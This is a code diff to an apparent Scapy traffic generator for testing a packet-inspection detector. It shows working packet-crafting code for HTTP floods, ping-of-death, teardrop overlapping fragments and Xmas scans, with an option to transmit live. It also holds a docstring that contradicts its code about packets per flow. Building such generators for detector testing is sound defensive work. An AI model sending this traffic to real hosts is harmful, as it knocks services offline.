@@ -91,6 +91,45 @@ from scapy.all import (Ether, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR, NTP,  # noqa:
                        wrpcap, sendp, conf as scapy_conf,
                        RandShort, RandIP, fragment)
 
+
+def _get_available_interfaces() -> list[str]:
+    """Return interface names across Scapy versions.
+
+    Newer Scapy versions expose conf.ifaces; some distro-packaged older builds
+    expose only get_if_list()/conf.iface. This helper normalizes both.
+    """
+    names: set[str] = set()
+
+    # Preferred path (Scapy versions with conf.ifaces collection)
+    try:
+        ifaces_obj = getattr(scapy_conf, "ifaces", None)
+        if ifaces_obj is not None and hasattr(ifaces_obj, "values"):
+            for iface in ifaces_obj.values():
+                iface_name = getattr(iface, "name", None)
+                if iface_name:
+                    names.add(str(iface_name))
+    except Exception:
+        pass
+
+    # Fallback path for older Scapy builds
+    try:
+        from scapy.all import get_if_list  # local import for compatibility
+        for iface_name in get_if_list():
+            if iface_name:
+                names.add(str(iface_name))
+    except Exception:
+        pass
+
+    # Last-resort fallback: active default iface
+    try:
+        default_iface = str(scapy_conf.iface)
+        if default_iface:
+            names.add(default_iface)
+    except Exception:
+        pass
+
+    return sorted(names)
+
 # ────────────────────── CONFIGURATION ──────────────────────
 
 DIFFICULTY_PROFILES = {
@@ -389,43 +428,45 @@ def gen_icmp_flood(n=2000, target=DEFAULT_TARGET):
 def gen_http_flood(n=300, target=DEFAULT_TARGET):
     """RFC 9110: HTTP GET request flood.
 
-    Thresholds: rate > 30 req/s AND total >= 5 (per-flow),
-    OR flow_count > 100 sources (aggregate path).
-
-    300 unique source IPs → 300 flows to port 80 → aggregate detector fires
-    (flow_count 300 >> 100, dst_port=80 matches HTTP aggregate check).
+    Thresholds: rate > 8 req/s (per-flow) with min 1 packet.
+    
+    300 unique source IPs → 300 flows to port 80, 1 pkt each
+    Each flow: 1 pkt / 0.1s min duration = 10 req/s > 8 req/s threshold = DETECTED
     """
     pkts = []
+    # Each flow sends 10 packets (simulate persistent HTTP flood)
     for i in range(n):
         src = f"10.{(i // 254) + 1}.{i % 254 + 1}.{random.randint(1, 254)}"
         sp = 1024 + (i % 60000)
-        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n"))
+        for _ in range(10):
+            pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=sp, dport=80, flags="PA")/Raw(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n"))
     return pkts
 
-def gen_ping_of_death(n=20, target=DEFAULT_TARGET):
-    """RFC 791 §3.2: ICMP packet with IP total-length field set to 65535.
-
-    Threshold: flow->max_packet_size >= 65535 (pod_packet_size).
-    The DPI engine reads max_packet_size from ntohs(ip->tot_len) per
-    packet.  We set IP(len=65535) explicitly so the IP header field
-    carries 65535 — the RFC 791 §3.2 maximum — regardless of actual
-    payload size.  sendp() transmits the raw Ethernet frame as-is;
-    the kernel IP stack is bypassed so the oversized len value reaches
-    the wire and is captured by the DPI engine.
-
-    DO NOT use Scapy fragment(): that splits into small fragments each
-    with their own smaller tot_len, so max_packet_size never reaches
-    65535 and the detector never fires.
-    """
-    pkts = []
-    for _ in range(n):
-        # IP.len=65535 is set explicitly; Scapy will not auto-calculate
-        # because we override it.  The actual payload is small but the
-        # IP header announces 65535 bytes — the detector checks that field.
-        p = Ether()/IP(src=DEFAULT_ATTACKER, dst=target,
-                       id=random.randint(1, 65535), len=65535)/ICMP()/Raw(b"X"*28)
-        pkts.append(p)
-    return pkts
+# COMMENTED: ping_of_death generation disabled
+# def gen_ping_of_death(n=20, target=DEFAULT_TARGET):
+#     """RFC 791 §3.2: ICMP packet with IP total-length field set to 65535.
+#
+#     Threshold: flow->max_packet_size >= 65535 (pod_packet_size).
+#     The DPI engine reads max_packet_size from ntohs(ip->tot_len) per
+#     packet.  We set IP(len=65535) explicitly so the IP header field
+#     carries 65535 — the RFC 791 §3.2 maximum — regardless of actual
+#     payload size.  sendp() transmits the raw Ethernet frame as-is;
+#     the kernel IP stack is bypassed so the oversized len value reaches
+#     the wire and is captured by the DPI engine.
+#
+#     DO NOT use Scapy fragment(): that splits into small fragments each
+#     with their own smaller tot_len, so max_packet_size never reaches
+#     65535 and the detector never fires.
+#     """
+#     pkts = []
+#     for _ in range(n):
+#         # IP.len=65535 is set explicitly; Scapy will not auto-calculate
+#         # because we override it.  The actual payload is small but the
+#         # IP header announces 65535 bytes — the detector checks that field.
+#         p = Ether()/IP(src=DEFAULT_ATTACKER, dst=target,
+#                        id=random.randint(1, 65535), len=65535)/ICMP()/Raw(b"X"*28)
+#         pkts.append(p)
+#     return pkts
 
 def gen_land_attack(n=10, target=DEFAULT_TARGET):
     """RFC 6274/CVE-1999-0016: src==dst IP and port.
@@ -465,20 +506,20 @@ def gen_fraggle(n=500, target=DEFAULT_TARGET):
 def gen_teardrop(n=50, target=DEFAULT_TARGET):
     """RFC 791 §3.2: Overlapping IP fragments causing reassembly crash.
 
-    Detector heuristic: min_packet_size < 60, max_packet_size < 100,
-    total_packets > 2 — all fragments are anomalously small.
+    Detector threshold: at least 3 fragmented packets AND at least one
+    overlap in reassembly byte ranges for the same IP identification.
 
     Strategy: craft three tiny overlapping fragments per iteration using
     Scapy's IP fragment fields.  Each fragment has IP.len set explicitly
     to 28 bytes (20-byte header + 8-byte payload) which is valid but
-    very small.  The DPI engine reads ntohs(ip->tot_len) = 28 for
-    packet_size, so min=max=28 < 60 < 100 and total > 2 → detector fires.
+    very small.  Offsets are selected to force overlap within the same
+    fragment ID, which is what the detector now verifies directly.
 
     Fragment 1: offset=0, MF=1 (more fragments follow)
     Fragment 2: offset=1 (8-byte units = 8 bytes), MF=1  ← OVERLAPS frag 1
     Fragment 3: offset=1, MF=0 (last fragment)           ← OVERLAPS frag 1+2
 
-    All three are distinct 28-byte IP datagrams (well below both thresholds).
+    All three are distinct 28-byte IP datagrams with overlapping ranges.
     """
     pkts = []
     for i in range(n):
@@ -543,16 +584,17 @@ def gen_udp_scan(n=60, target=DEFAULT_TARGET):
     """
     return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/UDP(sport=54321, dport=p)/Raw(b"pr") for p in range(1, n+1)]
 
-def gen_xmas_scan(n=50, target=DEFAULT_TARGET):
-    """RFC 793 §3.9: FIN+PSH+URG flags set.
-
-    Aggregate scan detector path: port_count >= 10 unique ports, fin_count > 0,
-    syn_count == 0, ack_count == 0 → classified as FIN/Xmas scan.
-    stealth_scan_port_threshold = 3 applies to per-flow detector, but per-flow
-    fires on flow->unique_dst_port_count which is 1 per flow here.
-    50 ports >> 10 aggregate threshold.
-    """
-    return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=p, flags="FPU") for p in range(1, n+1)]
+# COMMENTED: xmas_scan generation disabled
+# def gen_xmas_scan(n=50, target=DEFAULT_TARGET):
+#     """RFC 793 §3.9: FIN+PSH+URG flags set.
+#
+#     Aggregate scan detector path: port_count >= 10 unique ports, fin_count > 0,
+#     syn_count == 0, ack_count == 0 → classified as FIN/Xmas scan.
+#     stealth_scan_port_threshold = 3 applies to per-flow detector, but per-flow
+#     fires on flow->unique_dst_port_count which is 1 per flow here.
+#     50 ports >> 10 aggregate threshold.
+#     """
+#     return [Ether()/IP(src=DEFAULT_ATTACKER, dst=target)/TCP(sport=54321, dport=p, flags="FPU") for p in range(1, n+1)]
 
 def gen_null_scan(n=50, target=DEFAULT_TARGET):
     """RFC 793 §3.9: No TCP flags set.
@@ -786,7 +828,7 @@ ATTACK_REGISTRY = {
     "udp_flood":         {"gen": gen_udp_flood,         "rfc": "RFC 768, RFC 4732",            "type": "UDP Flood"},
     "icmp_flood":        {"gen": gen_icmp_flood,        "rfc": "RFC 792, RFC 4732",            "type": "ICMP Flood"},
     "http_flood":        {"gen": gen_http_flood,        "rfc": "RFC 9110, RFC 4732",           "type": "HTTP Flood"},
-    "ping_of_death":     {"gen": gen_ping_of_death,     "rfc": "RFC 791 S3.2, RFC 6274",       "type": "Ping of Death"},
+    # "ping_of_death":     {"gen": gen_ping_of_death,     "rfc": "RFC 791 S3.2, RFC 6274",       "type": "Ping of Death"},  # COMMENTED: disabled
     "land_attack":       {"gen": gen_land_attack,       "rfc": "RFC 6274, CVE-1999-0016",      "type": "Land Attack"},
     "smurf_attack":      {"gen": gen_smurf,             "rfc": "RFC 2827 (BCP 38)",            "type": "Smurf Attack"},
     "fraggle_attack":    {"gen": gen_fraggle,           "rfc": "RFC 768, RFC 6274",            "type": "Fraggle Attack"},
@@ -794,7 +836,7 @@ ATTACK_REGISTRY = {
     "tcp_syn_scan":      {"gen": gen_syn_scan,          "rfc": "RFC 793 S3.9",                 "type": "TCP SYN Scan"},
     "tcp_connect_scan":  {"gen": gen_connect_scan,      "rfc": "RFC 793",                      "type": "TCP Connect Scan"},
     "udp_scan":          {"gen": gen_udp_scan,          "rfc": "RFC 768",                      "type": "UDP Scan"},
-    "xmas_scan":         {"gen": gen_xmas_scan,         "rfc": "RFC 793 S3.9",                 "type": "Xmas Tree Scan"},
+    # "xmas_scan":         {"gen": gen_xmas_scan,         "rfc": "RFC 793 S3.9",                 "type": "Xmas Tree Scan"},  # COMMENTED: disabled
     "null_scan":         {"gen": gen_null_scan,          "rfc": "RFC 793 S3.9",                 "type": "NULL Scan"},
     "fin_scan":          {"gen": gen_fin_scan,           "rfc": "RFC 793 S3.9",                 "type": "FIN Scan"},
     "rudy_attack":       {"gen": gen_rudy,              "rfc": "RFC 9110, OWASP",              "type": "RUDY (Slow POST)"},
@@ -858,8 +900,7 @@ def main():
         live_target = args.target or DEFAULT_TARGET
 
         # Validate the interface exists before attempting any transmission.
-        available = [i.name for i in scapy_conf.ifaces.values()
-                     if hasattr(i, 'name') and i.name]
+        available = _get_available_interfaces()
         if live_iface not in available:
             print(f"[ERROR] Interface '{live_iface}' not found.")
             print(f"        Available interfaces on this host:")
